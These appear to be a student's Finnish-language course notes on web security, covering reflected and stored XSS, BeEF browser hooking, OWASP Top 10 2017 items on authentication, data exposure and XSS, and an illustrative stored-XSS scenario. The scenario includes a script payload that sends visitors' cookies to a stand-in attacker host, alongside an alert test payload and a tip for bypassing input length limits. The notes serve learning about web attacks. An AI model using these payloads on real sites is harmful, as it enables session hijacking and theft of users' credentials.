# x)

## Cross Site Scripting [Percival & Samancioglu 2020, Chapter 21](https://learning.oreilly.com/videos/the-complete-ethical/9781839210495/9781839210495-video21_1/)

- Tapa injektoida javascriptiä webbisivulle
- XSS Reflected: Manipuloidaan URLia ja lähetetään URL kohteelle, ja uhrin klikatessa linkkiä Javascriptiä ajetaan tämän selaimessa.
    - Haavoittuvuutta voidaan testata esim. ajamalla missä tahansa sivun inputissa (chatit, searchit, messaget yms) scriptiä `<script>alert('toimiiko?')</script>`, ja mikäli sivulla on XSS haavoittuvuus, näytölle tulee alertti.
    - Samalla URL muokkautui ja se voidaan lähettää kenelle tahansa, ja klikkaamalla aukeaa sama alertti
- XSS Stored: URL manipuloinnin sijaan Javascriptiä talletetaan sivulle. Koodia ajetaan siis kohteen koneella aina, kun kuka tahansa menee sivustolle.
    - Inputeilla voi taas kokeilla `<script> jotain koodia </script>`
    - Javascript tallentuu sivustolle
- Joskus inputeissa maximikirjainmäärä voi rajoittaa koodin määrää. 
    - Voidaan mahdollisesti ohittaa -> Inspect, etsitään HTML elementeistä oikea inputti ja muokataan elementin max pituutta
- [BeEF](https://beefproject.com/) (Browser Exploitation Framework Project)
    - Ajamalla BeEFin javascriptiä webbisivulla, kaikki sivulla kävijät saadaan "koukkuun" BeEFiin ja näiden ip-osoitteet ja muuta tietoa
    - Koukussa oleviin koneihin voidaan nyt ajaa etänä komentoja, jotka suorittavat välittömästi kohteen päässä
- Javacriptin voi poistaa käytöstä selaimen asetuksissa. Tai blokata vain tietyille sivustoille

## [OWASP Top 10 - 2017](https://raw.githubusercontent.com/OWASP/Top10/master/2017/OWASP%20Top%2010-2017%20(en).pdf)

### A2 Broken Authentication
- Hyökkääjillä käytössä valmiita käyttäjänimi, salasana, sanakirja-listoja, joita voidaan kokeilla kirjatutumiseen
- Ajetaan valmiita sanakirjalistoja yksinkertaisten salasanojen selvittämiseksi, esim Password1 tai vertaillaan heikkoja häshättyjä salasanoja, joissa on monta oikeaa vastausta.
- Voidaan poimia tärkeitä tietoja URLista, kuten vaikka session ID

### A3 Sensitive Data Exposure
- Tärkeän datan tulisi aina olla suojattua, cryptattua esim. SHA512. HTTPn vaarat -> ei suojattu yhteys
- Data viedään salattuna tietokantaan, mutta noutovaiheessa salaus puretaan automaattisesti, jolloin esim. SQL injektiolla voidaan saada tärkeitä tietoja, kuten luottokorttitiedot, selkokielisenä.

### A7 Cross Site Scripting
- Tarkoitus etäajaa koodia uhrin selaimessa.
- Automaattisia työkaluja, jotka tunnistaa kaikki 3 XSSn muotoa ja valmiita exploitteja
- Kahdessa kolmesta applikaatiosta löytyy XSS haavoittuvuuksia
    - PHP, J2EE / JSP, ASP.NET teknologioita sisältävistä löytyy erityisesti
- Nettisivun input kentän syötteet tulevat URLiin ja URLia voidaan muokata ajamaan jotakin javascript komentoa. Urlia jakamalla ja lopulta uhrin klikatessa sitä selain ajaa urliin upotetut javascript komennot, jotka voi aiheuttaa esimerkiksi session IDn menettämisen hyökkääjälle, joka voi kaapata käynnissä olevan session.

# z) Cross site story, esimerkki Stored XSS hyökkäyksestä
- Nettisivustolla on viestittely ominaisuus, jonka kautta sivun käyttäjät voivat jättää viestejä toisille sivustolla kävijöille, esimerkiksi jokin foorumi.
    - `<p>Hei, tässä on tämä viestini!</p>`
- Applikaatio ei prosessoi lähetettyjä viestejä muuten kuin printtaamalla ne sivustolle, joten hyökkääjä voi suoraan lähettää haitallisia viestejä muille käyttäjille. Hyökkääjä siis voi itse kirjoittaa foorumille vaikkapa alla olevan viestin:
    - `<p><script>document.location='http://www.hyökkääjä.com/cgi-bin/cookie.cgi?foo='+document.cookie</script></p>`
    - Tämän hyökkäyksen tarkoitus on lähettää uhrin session ID hyökkääjälle, jolla hyökkääjä voi varastaa istunnon oikeudet, esimerkiksi ylläpitäjältä
    - Kun uhri avaa foorumisivun missä hyökkääjän javascript on istutettu viestiin, se ajetaan uhrin selaimessa ja scripti lähettää tiedot hyökkääjän nettisivuille.
    - Hyökkääjä saa haltuunsa tietoja kaikilta sivulla kävijöiltä, kun riittävät käyttöoikeudet omaava henkilö käy sivulla, hyökkääjällä onkin sivuston käyttöoikeudet yks kaks hallussaan.

# a) WebGoat
## A2 Broken Authentication
## A3 Sensitive Data Exposure
## A7 Cross Site Scripting XSS
## A8 Request Forgeries

